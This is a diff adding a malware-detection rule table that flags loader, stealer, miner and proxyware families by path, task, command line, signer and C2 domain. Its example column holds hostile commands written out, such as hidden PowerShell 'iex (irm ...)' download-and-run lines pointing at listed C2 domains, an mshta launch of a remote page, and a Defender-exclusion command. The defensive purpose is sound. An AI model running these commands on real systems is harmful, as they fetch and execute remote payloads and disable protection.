@@ -1,0 +1,217 @@
+# Spor autodetect: known malware. Built from FenrisHub malware (B) rules, rewritten for what Spor sees.
+# Columns (tab-separated): kind, match, family, note, example, FenrisHub rule ids covered (provenance).
+# kind: path, task (as Spor prints it, \Folder\Name), run (Run value name), service (name), cmd (command line),
+#       software ("name | version | publisher"), company (signer and version-resource text), domain (DNS name; = also matches subdomains).
+# match: =text (the whole value), *text (part of it), /regex/ key=text (key: a lowercase literal every match contains).
+#        Case-insensitive; (?-i:...) where case matters. A regex without a key runs on every value: only for task, run, service, software.
+# Every row must match its own example (tests). Only patterns of recurring families; no one-off random names.
+
+
+# RenLoader (RenPy / Node.js loaders from fake game and software download sites)
+path	/\\Temp\\tmp-\d{3,6}-[A-Za-z0-9]{12}\\[A-Za-z0-9]{9}\.exe$/ key=\tmp-	RenLoader	payload in a Node.js tmp folder	C:\Users\anna\AppData\Local\Temp\tmp-20656-vmkfjqTWAOFi\ehyISWlPN.exe	7949,8088,8522,9936,10001,10003,10248,10249,10475,10477
+path	/\\Downloads\\tmp-\d{3,6}-[A-Za-z0-9]{12}(\\|$)/ key=\downloads\tmp-	RenLoader	dropper folder in Downloads	C:\Users\anna\Downloads\tmp-39304-wscJmiyovbGx\Setup.exe	22843,26838,27062,27064,27084,27086,27102,27105,27107,27519,27550,27627
+path	/\\Downloads\\[^\\]*_Archive_(free|full|win|win64|x64|get|file|latest)_\d{3,6}(\.(zip|rar|7z))?(\.old)?(\\|$)/ key=_archive_	RenLoader	lure archive from a fake download site	C:\Users\anna\Downloads\Bloodborne_Complete_Edition_v1.09_+_All__Archive_file_883627.zip	14898,15422,15436,15437,15438,15439,15470,18790,19585,20242,20243,26044,26045,26046,26194,26195,26323,26324,26325,26326,27103,27104,27845,27846,28306
+path	*\downloads\free files downloaded	RenLoader	lure archive from a fake download site	C:\Users\anna\Downloads\Free Files Downloaded.zip	5761
+path	/^[a-z]:\\Users\\[^\\]+\\[a-z]{2}\.exe(\\[^\\]+\.exe)?$/ key=.exe	RenLoader	two-letter program in the user folder (HijackLoader stage)	C:\Users\anna\nn.exe	6330,6569,6573,7211,7554,8550,8551,8552,8553,8582,8676,8678,8811,9570,9937,9949,10004,10197,10198,10203,10204,10205,10214,10424,10492,10540,10697,11636,11637,11638,11639,11641,11643,12022
+path	/^[a-z]:\\ProgramData\\(?:[a-z0-9]+(?:_[a-z0-9]+)*_(?:v\d+(?:_\d+)*|net\d+|win32|win64|amd64|arm64|i386|i686|x86|x64|arm|lts|rc|dev|dbg|debug|prod|pro|ent|sys|core|driver|test|rel|rtm|stable)(?:_[a-z0-9]+)*|(?:com|lib|ext|net|pro|base|cmd|rest|api|srv|sys|usr|dev|int|ms)_[a-z0-9]+(?:_[a-z0-9]+)*)\\[^\\]+\.(exe|dll)$/ key=\programdata\	RenLoader	program in a generated folder name (name_v11, com_x_y)	C:\ProgramData\UDPnano_v11\Debug-Mod16.exe	8,6328,7205,7557,7901,7915,7954,8554,9932,9950,9952,10065,10069,10112,10116,10126,10137,10163,10167,10194,10202,10213,10218,10251,10487,10494,10616,10709,10744,10746,10769,10794,10824,10974,13011,13013,13030,13201,13513,13687,13959,13966,13971,14510,14512,14519,14526,14555,14692,14700,14701,14877,15190,15214,15396,15421,15427,15462,15473,15474,15477,15482,18753,18754,18755,18756,18760,18877,18878,18889,18940,18941,18945,19152,19180,19303,19631,19767,19858,19863,19864,20068,20537,21164,21488,21529,21532,21610,21676,22669,24874,24934,25332,26149,26499,26531,26532,26533,26534,26537,26736,26839,26903,26910,26911,26912,27063,27087,27549,27557,27566,27589,27590,27621,27622
+path	/\\AppData\\Roaming\\(?:[a-z0-9]+(?:_[a-z0-9]+)*_(?:v\d+(?:_\d+)*|net\d+|win32|win64|amd64|arm64|i386|i686|x86|x64|arm|lts|rc|dev|dbg|debug|prod|pro|ent|sys|core|driver|test|rel|rtm|stable)(?:_[a-z0-9]+)*|(?:com|lib|ext|net|pro|base|cmd|rest|api|srv|sys|usr|dev|int|ms)_[a-z0-9]+(?:_[a-z0-9]+)*)\\[^\\]+\.(exe|dll)$/ key=\appdata\roaming\	RenLoader	program in a generated folder name (name_v11, com_x_y)	C:\Users\anna\AppData\Roaming\com_ext_config\Vector-Sens.exe	7,6329,7207,7555,7902,7916,7955,8555,9931,9951,10064,10070,10111,10115,10122,10139,10162,10166,10193,10201,10211,10252,10438,10486,10495,10537,10614,10707,10743,10748,10767,10795,10823,10975,10984,13514,13691,13967,14511,14518,14524,14693,15215,15245,15395,15405,15428,15463,15478,18749,18879,18887,18943,19153,19183,19304,19630,19865,20069,20538,21165,21489,21530,21533,21608,21675,22670,24933,25331,26509,26538,26735,26905,26906,26907,27078
+path	/\\Start Menu\\Programs\\Startup\\(?:[a-z0-9]+(?:_[a-z0-9]+)*_(?:v\d+(?:_\d+)*|net\d+|win32|win64|amd64|arm64|i386|i686|x86|x64|arm|lts|rc|dev|dbg|debug|prod|pro|ent|sys|core|driver|test|rel|rtm|stable)(?:_[a-z0-9]+)*|(?:com|lib|ext|net|pro|base|cmd|rest|api|srv|sys|usr|dev|int|ms)_[a-z0-9]+(?:_[a-z0-9]+)*)\.(lnk|bat|hta|vbs|cmd)$/ key=\startup\	RenLoader	Startup item with a generated name	C:\Users\anna\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\corebridge_v2.lnk	11,8581,8810,10476,10478,10529,13956,19862
+path	/\\Start Menu\\Programs\\Startup\\[^\\]+\.hta$/ key=\startup\	RenLoader	HTA script in the Startup folder	C:\Users\anna\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AlSe.hta	19851,21277,21537,22666,27625,27626,28301
+path	*\builderbeta.	RenLoader	BuilderBeta persistence (renamed signed program, DLL side-loading)	C:\ProgramData\AMDBase_lts\BuilderBeta.exe	19863,27631
+run	=BuilderBeta	RenLoader	BuilderBeta persistence	BuilderBeta	27631
+path	/\\AppData\\Local\\[^\\]+\\[^\\]+\\[^\\]+\\(?-i:[0-9A-F]{8})\\[A-Za-z]+\.exe$/ key=\appdata\local\	RenLoader	payload in an 8-hex cache folder	C:\Users\anna\AppData\Local\Realtek\AppCache\LocalState\E0EE17CC\IntelCacheHost.exe	27509,27511,27512,27619
+task	/^\\[A-Z][A-Za-z]+(?: [A-Z][A-Za-z]+){0,3} \d{3,5}-(?:S-1-5-21-\d+-\d+-\d+-\d+|\d{3}-\d{4})$/	RenLoader	task named words + number + user SID	\Apex Pipeline Israel 14671-306-1001	5799,10068,10076,10084,10113,10125,10140,10160,10165,10196,10289,10480,10901,10944,11642,11929,11942,12007,12015,12020,12197,13031,13590,13720,13726
+run	/^[A-Z][A-Za-z]+(?: [A-Z][A-Za-z]+){1,3} \d{5}$/	RenLoader	Run entry named words + number	Timber Broker Guatemala 55516	10,11635
+task	/CL_NCL_[0-9a-f]{16}/ key=cl_ncl_	RenLoader	RenPyLoader task (CL_NCL_ + 16 hex)	\Google Compatibility Appraiser CL_NCL_ad77cbfc5080715d	10368,10471,10472,10474,10617,10710,10755,10756,10770,10771
+run	*cl_ncl	RenLoader	RenPyLoader Run entry (CL_NCL)	WindowsPowerShell_v1.0 CL_NCL	8771
+task	/^\\(Realtek|Outlook|Photos|PowerPoint|Widgets|Excel|Word|OneNote|Teams|Intel|Settings) [A-Za-z]+ Task$/ key= task	RenLoader	task named like a vendor task	\Realtek Graphics Task	27511,27512,27514,27515,27628
+cmd	/\\n?gep\.exe"?\s.*node_modules\.asar/ key=node_modules.asar	RenLoader	renamed Python/Node runtime starting node_modules.asar	"C:\Users\anna\AppData\Roaming\obs-studio\updates\LocalCache\gep.exe" "C:\Users\anna\AppData\Roaming\obs-studio\updates\LocalCache\node_modules.asar"	10068,10480,11635
+cmd	*\gamelan.py	RenLoader	Python stage gamelan.py	C:\Users\anna\AppData\Local\fontconfig\cache\f1d1c3dd\pythonw.exe "C:\Users\anna\AppData\Local\fontconfig\cache\f1d1c3dd\gamelan.py"	11929,12015,12091
+software	/^[^|]+ \| \d\.\d \| (Qualcomm Technologies Inc\.|Corsair Components Inc\.|VIA Technologies Inc\.|TP-Link Technologies Co\., Ltd\.|Texas Instruments Inc\.|Renesas Electronics Corporation|Samsung Electronics Co\., Ltd\.|Broadcom Inc\.|Marvell Technology Group Ltd\.|Synaptics Incorporated|Wacom Technology Corp\.|JMicron Technology Corp\.|Creative Technology Ltd\.|C-Media Electronics Inc\.|Logitech Inc\.|Realtek Semiconductor Corp\.|AVerMedia Technologies Inc\.|Conexant Systems Inc\.)$/ key= | 	RenLoader	fake hardware-vendor program (version d.d)	Network Helper | 2.6 | Marvell Technology Group Ltd.	14509,14621,14622,14630,14634,15047,15050,15148,15185,15240,15262,15263,15340,15413,15433,15434,15440,15441,15471,19263,19301,19306,19706,19783,19793,20325,20543,21102,21227,23289,23868,24491,24981,25020,25021,25227,25228,26148,26212,26381,26382,26510,26737,26739,26741,26836,27024,27100,27448,27502,27617,27620,28332
+software	/^(PhysX Runtime|Graphics Command Center|Driver Support Assistant) \| [^|]* \| (NVIDIA Corporation|Intel Corporation)$/ key= | 	RenLoader	fake NVIDIA / Intel program	PhysX Runtime | 2.1 | NVIDIA Corporation	20149,27028,27973
+software	/^[a-z]+(?:[_-][a-z]+)*[_-]v?\d+\.\d+\.\d+(?:[_-](?:x64|win32))? \| [^|]* \| (Qualcomm Technologies Inc\.|Corsair Components Inc\.|VIA Technologies Inc\.|TP-Link Technologies Co\., Ltd\.|NVIDIA Corporation|Texas Instruments Inc\.|Renesas Electronics Corporation|Samsung Electronics Co\., Ltd\.|Broadcom Inc\.|Marvell Technology Group Ltd\.|Synaptics Incorporated|Wacom Technology Corp\.|JMicron Technology Corp\.|Creative Technology Ltd\.|C-Media Electronics Inc\.|Logitech Inc\.|Realtek Semiconductor Corp\.|Intel Corporation|AVerMedia Technologies Inc\.|Conexant Systems Inc\.)$/ key= | 	RenLoader	fake hardware-vendor setup entry	commercial_full_extract_5.0.4 | 5.0.4 | TP-Link Technologies Co., Ltd.	14509,14621,14622,14630,14631,14634,15047,15050,15185
+path	/\\AppData\\Local\\(Broadcom\\Wireless Utility|C-Media\\USB Audio Controller|Corsair\\(Device Controller Helper|Lighting Control Agent)|Logitech\\Unifying Agent|NVIDIA\\PhysX Runtime|Qualcomm\\(Killer Network Service|QCA Configuration|Wireless Toolkit)|Renesas\\USB3 Runtime|Synaptics\\(HID Configuration|Pointing Device Driver)|VIA\\HD Audio Deck|Realtek\\Windows\\Temp)\\/ key=\appdata\local\	RenLoader	fake hardware-vendor folder	C:\Users\anna\AppData\Local\Qualcomm\Wireless Toolkit\prefetch_ad37.exe	15466,27511
+
+# PavinLoader
+task	/^\\(CacheEngineSession|NetEngine|CacheManager|ConfigHost|conhost|SearchHost|SearchIndexer|spoolsv|svchost|WinService|DataServiceAgent|DeskEngineEngine|IndexSyncAgent|NetHost)$/	PavinLoader	task named like a Windows process	\CacheEngineSession	25263,27108,27814,27960,27961,27965,27966,28330,28331
+path	/\\AppData\\(Local\\Microsoft\\Windows\\(Caches|WebCache|Explorer|Notifications|INetCache)|Roaming\\Microsoft\\(Protect|Crypto|Windows\\Libraries))\\[A-Za-z0-9]+\\[^\\]+\.(csproj|targets|cmd|sln|props|lnk|exe|wsf|vbs)$/ key=\microsoft\	PavinLoader	build or script file in a Windows cache folder	C:\Users\anna\AppData\Local\Microsoft\Windows\Caches\OneDriveSync\OneDriveSync.csproj	15070,21484,21486,26125,26126,26127,26196,26197,27109,27446,27447,27618,27642
+path	/\\INetCache\\[A-Za-z]+\\(build\.cmd|MSBuild\.exe)$/ key=\inetcache\	PavinLoader	build.cmd or fake MSBuild.exe in INetCache	C:\Users\anna\AppData\Local\Microsoft\Windows\INetCache\HealthCheckService\MSBuild.exe	27109,27615,27630
+path	/\\AppData\\Roaming\\(?-i:[0-9a-f]{12})\\(AutoIt3|RegAsm|pythonw)\.exe$/ key=\appdata\roaming\	PavinLoader	AutoIt3/RegAsm/pythonw in a 12-hex folder	C:\Users\anna\AppData\Roaming\8e9279a59036\AutoIt3.exe	25094,25255,26738,27110,27616
+cmd	/\\AppData\\Local\\Microsoft\\Windows\\Caches\\[^\\"]+\\[^\\"]+\.wsf/ key=\caches\	PavinLoader	script in a Windows cache folder	C:\Windows\System32\wscript.exe //B //NoLogo "C:\Users\anna\AppData\Local\Microsoft\Windows\Caches\DataExportRunner\DataExportRunner.wsf"	27614,27618,27960,27961
+path	*\appdata\local\datasync dynamics\	PavinLoader	install folder	C:\Users\anna\AppData\Local\DataSync Dynamics\x.exe	26946
+
+# CountLoader
+task	/^\\[A-Za-z0-9_]+\{[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{15}\}$/	CountLoader	task name + {4-4-4-4-15 hex}	\ServiceTask{10EA-DA7D-FDF7-D0D9-AB4121FAF148998}	10427,10428,11816,11817,11818,11819,15198,18957,19042,19043,19045,19046,19047,19049,19050,19052,19053,19055,19056,19058,19059,19061,19062,19064,19065,19067,19068,19070,19072,19073,19075,19077,19078,19080,19083,19084,19085,19086,19088,19089,19090,19091,19092,19093,19094,19095,19096,19097,19098,19099,19100,19101,19102,19103,19104,19105,19106,19107,19108,19109,19110,19111,19112,19113,19114,19115,19139
+path	/\\Users\\[^\\]+\\(Run|App)_\{[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{15}\}\.py$/ key=}.py	CountLoader	Python stage	C:\Users\anna\App_{17C2-F3BE-B65E-EF8C-40EABC1CC9F24D5}.py	19044,19048,19051,19054,19057,19060,19063,19066,19069,19071,19074,19076,19079,19081,19082,19140
+cmd	*\*i*\*2\msh*e	CountLoader	obfuscated mshta path in PowerShell	powershell -c "Start-Process \*i*\*2\msh*e https://example.vg"	13221
+domain	/(^|\.)s\d+-microservice-updatehub\.cc$/ key=microservice-updatehub.cc	CountLoader	C2 domain	s3-microservice-updatehub.cc	18957
+cmd	*microservice-updatehub.cc	CountLoader	C2 domain	powershell.exe -ep Bypass -Command "$u='https://s{i}-microservice-updatehub.cc';iex (irm $u)"	18957
+domain	=ccleaner.gl	CountLoader	C2 domain	x.ccleaner.gl	19012
+domain	=command-center.cc	CountLoader	C2 domain	x.command-center.cc	19030
+domain	=deluxe.gl	CountLoader	C2 domain	x.deluxe.gl	19014
+domain	=explorer.vg	CountLoader	C2 domain	x.explorer.vg	19016
+domain	=fileless-market.cc	CountLoader	C2 domain	x.fileless-market.cc	19011
+domain	=files-storage.cc	CountLoader	C2 domain	x.files-storage.cc	19017
+domain	=fileshare.vg	CountLoader	C2 domain	x.fileshare.vg	19015
+domain	=firefox.vg	CountLoader	C2 domain	x.firefox.vg	19018
+domain	=flowtracker.vg	CountLoader	C2 domain	x.flowtracker.vg	19031
+domain	=hosting-control.cc	CountLoader	C2 domain	x.hosting-control.cc	19022
+domain	=hosting-explorer.cc	CountLoader	C2 domain	x.hosting-explorer.cc	19021
+domain	=immortal-service.cc	CountLoader	C2 domain	x.immortal-service.cc	19023
+domain	=indeanapolice.cc	CountLoader	C2 domain	x.indeanapolice.cc	19025
+domain	=memory-scanner.cc	CountLoader	C2 domain	x.memory-scanner.cc	19027
+domain	=moderxdrsolution.vg	CountLoader	C2 domain	x.moderxdrsolution.vg	19019
+domain	=msgrouppolicy.vg	CountLoader	C2 domain	x.msgrouppolicy.vg	19020
+domain	=network-defender.cc	CountLoader	C2 domain	x.network-defender.cc	19013
+domain	=offshore-storage.cc	CountLoader	C2 domain	x.offshore-storage.cc	19028
+domain	=parent-control.cc	CountLoader	C2 domain	x.parent-control.cc	19010
+domain	=snconor.vg	CountLoader	C2 domain	x.snconor.vg	19024
+domain	=venom-flagman.cc	CountLoader	C2 domain	x.venom-flagman.cc	19026
+domain	=vless-proto.cc	CountLoader	C2 domain	x.vless-proto.cc	19029
+
+# ChromeLoader
+path	/\\AppData\\Local\\chrome_(display|test|performance)(\\|$)/ key=\chrome_	ChromeLoader	install folder	C:\Users\anna\AppData\Local\chrome_display\x.ps1	27638
+path	/\\AppData\\Roaming\\(Bloom|Tone|Energy|Cash|Diet|Healthy|Strength|Shape|Copy|Entertainment|opensubtitles-uploader)\\(Bloom|Tone|Energy|Cash|Diet|Healthy|Strength|Shape|Copy|Entertainment|opensubtitles-uploader|nw)\.exe$/ key=\appdata\roaming\	ChromeLoader	nw.js app in AppData	C:\Users\anna\AppData\Roaming\Tone\Tone.exe	27637
+task	=\ChromeLoader	ChromeLoader	task	\ChromeLoader	27636
+
+# Stealers and RATs
+path	/^[a-z]:\\ProgramData\\(?-i:[0-9a-f]{11,12})(\\|$)/ key=\programdata\	Vidar	folder with an 11-12 hex name in ProgramData	C:\ProgramData\46b035aabd1\x.dll	24345,28324,28325,28326,28327,28328
+path	/\\AppData\\Local\\[A-Za-z]{6,8}\\msu\.exe$/ key=\msu.exe	Vidar	msu.exe in a random folder	C:\Users\anna\AppData\Local\EasInv\msu.exe	28320,28321,28322,28323
+path	/\\MEIPreload\\intdb_win64\\[0-9a-f]{16}\\/ key=\meipreload\	NetSupport RAT	NetSupport client in a hidden cache folder	C:\Users\anna\AppData\Roaming\Microsoft\MEIPreload\intdb_win64\877928661c30ea39\capwind.exe	10059,10084
+path	/\\AppData\\Local\\(CloudHandler|HelixInspector)\\runtime\\/ key=\runtime\	Node.js RAT	Node.js RAT with Tor (ClickFix)	C:\Users\anna\AppData\Local\CloudHandler\runtime\node.exe	10081,10082,10086,10087,10088
+run	/^(CloudHandler|HelixInspector)$/	Node.js RAT	Run entry	HelixInspector	10082,10088
+path	*\programdata\marketscoutagent\	MarketScoutAgent	Python malware	C:\ProgramData\MarketScoutAgent\MarketScoutAgent.exe	21339,21373,21388,21389,21390,21391,21392,21393,21394,21395,21396,21397,21398,21399,21400,21401
+path	*\vscode-bootstrap.cmd	StoatWaffle	deploy script	C:\Users\anna\AppData\Local\Temp\vscode-bootstrap.cmd	28279
+cmd	*vscode-bootstrap.cmd	StoatWaffle	deploy script	cmd.exe /c C:\Users\anna\AppData\Local\Temp\vscode-bootstrap.cmd	28279
+path	/\\AppData\\Local\\Microsoft\\WindowsApps\\p?cAdobeCollabSync\.exe$/ key=adobecollabsync.exe	Python malware	fake AdobeCollabSync in WindowsApps	C:\Users\anna\AppData\Local\Microsoft\WindowsApps\pcAdobeCollabSync.exe	19037,19038,19039,19041
+path	/^[a-z]:\\Windows\\SystemHealth\\/ key=\systemhealth\	Python malware	Python in a fake Windows folder	C:\Windows\SystemHealth\Update\python.exe	18825,18826,18827
+path	*\system32\microsoftsoftwareupdatertask-	Node.js malware	Node.js in a fake System32 folder	C:\Windows\System32\MicrosoftSoftwareUpdaterTask-szpe\node.exe	10829,10830,10831,10832,10833,10834,10835,10836
+path	*\appdata\local\programs\python\python399\	Fake Python	Python 3.99 does not exist	C:\Users\anna\AppData\Local\Programs\Python\Python399\pythonw.exe	14916
+
+# LegionLoader / Robot Dropper
+software	/^[^|]+ \| [^|]* \| (Yuvia Loop Cro|Tioao Wesah|Kruaoq Competation Corp|Bitao Solutions|Trix Winqz Ro|Qoopa CaveCv)$/ key= | 	LegionLoader	program of a fake publisher (Robot Dropper)	Niwp App | 6.1.9 | Tioao Wesah	18948,20411,23563,24496,24497,24498,25638
+path	/\\AppData\\Roaming\\(Yuvia Loop Cro|Tioao Wesah|Kruaoq Competation Corp|Bitao Solutions|Trix Winqz Ro|Qoopa CaveCv)(\\|$)/ key=\appdata\roaming\	LegionLoader	folder of a fake publisher (Robot Dropper)	C:\Users\anna\AppData\Roaming\Bitao Solutions\x.exe	20281,23564,24493,24499,25639
+software	/^(?-i:(?=\S*[a-z][A-Z0-9])[A-Za-z0-9]{8,10} (?=\S*[a-z][A-Z0-9])[A-Za-z0-9]{8} \| [^|]* \| (?=\S*[a-z][A-Z0-9])[A-Za-z0-9]{9,12})$/	LegionLoader	program with a random name and publisher	qeSJFBjDnL zGokxDDu | 6.4.3436 | bAbxTUGRGl0l	26511,26843,26900,27503
+software	*koqlpo cynav tool	LegionLoader	program	Koqlpo Cynav Tool | 1.0 | x	14537
+
+# Fileless PowerShell and script loaders
+cmd	*--headless powershell.exe -windowstyle hidden -command	PowerShell loader	hidden PowerShell through conhost --headless	C:\WINDOWS\system32\conhost.exe --headless powershell.exe -WindowStyle Hidden -Command "& { $a=1 }"	15212,15213,15219
+cmd	*-nol -noni -w hidden -nop	PowerShell loader	hidden PowerShell	powershell.exe -NoL -NonI -W Hidden -NoP -c x	1
+cmd	*-w hidden -nop -ep bypass -c "&([scriptblock]::create	PowerShell loader	hidden PowerShell running a script block	powershell.exe -w hidden -nop -ep bypass -c "&([ScriptBlock]::Create((irm x)))"	15392
+cmd	/\b(iex|irm)\b.*\b0x[0-9a-f]{1,2}\.0x[0-9a-f]{1,2}\./ key=.0x	PowerShell loader	download from an IP written in hex	powershell -NoP -Exec Bypass -W Hidden -Command "Iex(Irm 0xc0.0x6d.0xc8.0x3f/regevent)"	5786
+cmd	/powershell.*\[reflection\.assembly\]::load/ key=[reflection.assembly]::load	PowerShell loader	.NET reflection loader	powershell.exe -w h -c [Reflection.Assembly]::Load($b)	18791
+cmd	/powershell.*(?-i:JAB)[A-Za-z0-9+/]{16,}/ key=jab	PowerShell loader	base64 PowerShell script	POWersHell.EXe -nopROfi -WinDOWSTYl HiD -EN JABmAGEAMAA5ADEAYgA9AFsAbQBhAHQAaAA	10469,10470
+cmd	/mshta(\.exe)?"?\s+"?https?:\/\// key=mshta	mshta loader	mshta runs a web page (ClickFix, CountLoader)	C:\WINDOWS\system32\mshta.exe https://msgrouppolicy.vg	6215
+cmd	*qqbkagqalqbnahaauabyaguazgblahiazqbuagmazqag	PowerShell loader	base64 Add-MpPreference (Defender exclusion)	powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMA	83,11782,11783
+task	/\{(\d{6,10})-\1\}$/	PowerShell loader	task name + {N-N} (AES PowerShell loader)	\MicrosoftEdgeUpdateTaskMachineCoreb{1795992834-1795992834}	15212,15213,15232,15233
+run	=Windows PowerShell v1.0	PowerShell loader	Run entry named like PowerShell	Windows PowerShell v1.0	14,5785,6565
+cmd	*(gal ?rm)	Zig ClipBanker	PowerShell download (gal ?rm)	powershell.exe -NoProfile -Command "sal psv1 powershell.exe; .(gal ?rm) 79.8141710/task | .(psv1)"	14,17,6565
+cmd	*.replace('rog', ''))	Zig ClipBanker	obfuscated PowerShell	powershell -c iex ('iROGex'.Replace('ROG', ''))	14,6565,6572
+task	=\Windows Perflog	Zig ClipBanker	task	\Windows Perflog	17,5786,8578
+
+# Coin miners
+path	*\appdata\local\microsoft\windows\diagnostics\performance\perfmonhost.exe	Coinminer	fake PerfMonHost	C:\Users\anna\AppData\Local\Microsoft\Windows\Diagnostics\Performance\PerfMonHost.exe	15053
+path	*\appdata\local\microsoft\windows\imanagementengine\	Coinminer	Python miner folder	C:\Users\anna\AppData\Local\Microsoft\Windows\IManagementEngine\python.exe	15104
+path	*\appdata\roaming\microsoft\securityupdates\	Coinminer	miner folder	C:\Users\anna\AppData\Roaming\Microsoft\SecurityUpdates\x.exe	10412
+path	*\appdata\roaming\microsoft\tlmtry\	Coinminer	miner folder	C:\Users\anna\AppData\Roaming\Microsoft\Tlmtry\x.exe	10410
+path	*\recovery\oem\windowsessentials	Coinminer	miner folder	C:\Recovery\OEM\WindowsEssentials\x.exe	15051
+path	*\systemprofile\appdata\roaming\useattribute	Coinminer	miner folder	C:\Windows\System32\config\systemprofile\AppData\Roaming\UseAttribute\x.exe	15054
+path	*\windows\copilot\manager\aimanager\	Coinminer	nssm service in a fake Copilot folder	C:\Program Files (x86)\Microsoft\Windows\Copilot\Manager\AIManager\nssm.exe	10077
+path	*\system32\wsvcz\	Coinminer	XMRig in a fake System32 folder	C:\Windows\System32\wsvcz\u718079.exe	14894,15268,28337
+path	/\\System32\\u\d{6}\.(dll|exe)$/ key=\system32\u	Coinminer	u+6 digits DLL service	C:\Windows\System32\u135682.dll	14884,14885,15266,15267,15313,28334,28335,28336
+service	/^u\d{6}$/	Coinminer	service u+6 digits	u135682	14885,15266
+company	*xmrig.com	Coinminer	XMRig	unsigned; ; company www.xmrig.com	14894,28337
+domain	=xmrig.com	Coinminer	XMRig site	xmrig.com	14883
+
+# Proxyware
+path	*\diagnosticsnet\	Proxyware	proxyware / browser injector folder (DiagnosticsNET)	C:\ProgramData\DiagnosticsNET\x.exe	82,19117,19119
+path	*\gamesavings\	Proxyware	proxyware / browser injector folder (GameSavings)	C:\ProgramData\GameSavings\x.exe	19118,19121
+path	*\sdkwin\	Proxyware	proxyware / browser injector folder (SdkWin)	C:\ProgramData\SdkWin\x.exe	15430,19122
+path	*\updateswin\	Proxyware	proxyware / browser injector folder (UpdatesWin)	C:\ProgramData\UpdatesWin\x.exe	80,19123
+path	*\winpackages\	Proxyware	proxyware / browser injector folder (WinPackages)	C:\ProgramData\WinPackages\x.exe	19124
+path	*\sdkruntimeagent\	Proxyware	proxyware / browser injector folder (SdkRuntimeAgent)	C:\ProgramData\SdkRuntimeAgent\x.exe	19127
+task	/^\\(IEPackages|GameSavings|GameSettingsDLC|GameUpdaterDLC|SystemCacheMaintenance|NetworkDiagnosticService)$/	Proxyware	task	\GameUpdaterDLC	31,32,33,76,77,78,79,88,19118,19125
+path	*\infatica	Infatica proxyware	files	C:\Program Files (x86)\Infatica\infatica_agent.exe	20279,26364,26365
+path	*\.infatica_noise_cache	Infatica proxyware	cache folder	C:\Users\anna\.infatica_noise_cache\x	15345
+path	*\system32\hopmn.conf	Infatica proxyware	config file	C:\Windows\System32\hopmn.conf	15346
+task	*infatica	Infatica proxyware	task	\infatica	26364,26365
+company	*infatica pte	Infatica proxyware	signer	valid; signer Infatica Pte. Ltd.	20279,26364
+
+# TamperedChef and other trojanized apps
+company	*lupus tech	TamperedChef	signer Lupus Tech	valid; signer Lupus Tech Limited	10407,10408
+company	*lupustech	TamperedChef	signer LupusTech	valid; signer LupusTech	21405
+path	*\appdata\roaming\fmcr\	TamperedChef	folder	C:\Users\anna\AppData\Roaming\FMCR\x.exe	42
+path	*\appdata\roaming\foodformula\	TamperedChef	folder	C:\Users\anna\AppData\Roaming\FoodFormula\x.exe	27859
+path	*\downloadhelpertray\	TamperedChef	anyPDF tray program	C:\Users\anna\AppData\Local\DownloadHelperTray\DownloadHelperTray.exe	10408
+run	=DownloadHelperTray	TamperedChef	anyPDF tray program	DownloadHelperTray	10408
+software	/^anypdf \|/ key=anypdf	TamperedChef	anyPDF	anyPDF | 1.0 | Lupus Tech	10407
+software	/^pdf editor[^|]* \| [^|]* \| (appsuite|user)$/ key=pdf editor	TamperedChef	AppSuite PDF Editor (backdoor)	PDF Editor 1.0.29 | 1.0.29 | AppSuite	27569,27570
+task	=\Crystal_updater	TamperedChef	CrystalPDF updater task	\Crystal_updater	41,44
+path	*\crystalpdf.exe	TamperedChef	CrystalPDF	C:\Users\anna\AppData\Local\Temp\crys\CrystalPDF.exe	40,44
+path	*\voice.ai	TamperedChef	Voice.ai (hidden view-bot function)	C:\Program Files\Voice.ai\VoiceAI.exe	15270,15271,15273,15275,15276,15277
+software	/^voice\.ai/ key=voice.ai	TamperedChef	Voice.ai (hidden view-bot function)	Voice.ai - Voice Changer | 1.0 | Voice.ai	15278
+path	*\programdata\nahimic\amindpdfcore	UsbSafeProtect worm	fake Nahimic folder	C:\ProgramData\Nahimic\AmindPDFCore.exe	27583,27584,27585
+path	*\usb safe protect.exe	UsbSafeProtect worm	USB worm copy	E:\Usb Safe Protect.exe	27583,27584,27585
+run	=Nahimics	UsbSafeProtect worm	Run entry	Nahimics	27585
+company	*amindpdf	UsbSafeProtect worm	signer	valid; signer AmindPDF Limited	27583,27584,27585
+
+# Adware, PUP-style malware and fake app stores
+company	*fast corporation ltd	PC App Store	signer Fast Corporation	valid; signer FAST CORPORATION LTD	14800,14807,14808
+path	*\pcappstore\	PC App Store	folder	C:\Program Files (x86)\PCAppStore\PCAppStoreSRV.exe	14796,14800,14807,14808,15195
+path	*\pc app store.lnk	PC App Store	shortcut	C:\Users\anna\Desktop\PC App Store.lnk	14791,14792,14793,19681
+path	*\chromstera	Chromstera	aggressive adware browser	C:\Program Files (x86)\Chromstera\chromstera.exe	19157
+software	/^chromstera/ key=chromstera	Chromstera	aggressive adware browser	Chromstera | 1.0 | Chromstera Research Solutions	19155
+cmd	*upperlevelx	Chromstera	Chromstera component	C:\Users\anna\AppData\Local\UpperLevelX\x.exe --run	19034,19035
+path	*\upperlevelx	Chromstera	Chromstera component	C:\Users\anna\AppData\Local\UpperLevelX\x.exe	19034,19035
+path	/\\GeneralAI(Framework|Support)\d?Solutions(\\|$)/ key=generalai	GeneralAISolutions	folder	C:\Program Files (x86)\GeneralAISupport2Solutions\x.exe	8563,8564,8568,8572,9918,9919,9920,13222,13223,13224
+path	/\\ProgramData\\Chromnius(Edge)?(\\|$)/ key=\programdata\chromnius	GeneralAISolutions	browser extension seed folder	C:\ProgramData\Chromnius\ExtensionSeed\x.json	8565,8571,13104,13105,13106,13107
+task	/^\\Net(One|Two)Updater$/ key=updater	GeneralAISolutions	task	\NetOneUpdater	8567,8570
+path	*\offergoose	OfferGoose	folder	C:\Users\anna\AppData\Roaming\OfferGoose\x.exe	10317,10320
+path	*\racingsim	RacingSim	folder	C:\Users\anna\AppData\Local\Programs\RacingSim\RacingSim.exe	22909,22910,22911,22912,22913,22914,22920
+run	=RacingSim	RacingSim	Run entry	RacingSim	22920
+software	/^racingsim/ key=racingsim	RacingSim	program	RacingSim 1.0.0 | 1.0.0 | RacingSim	22921
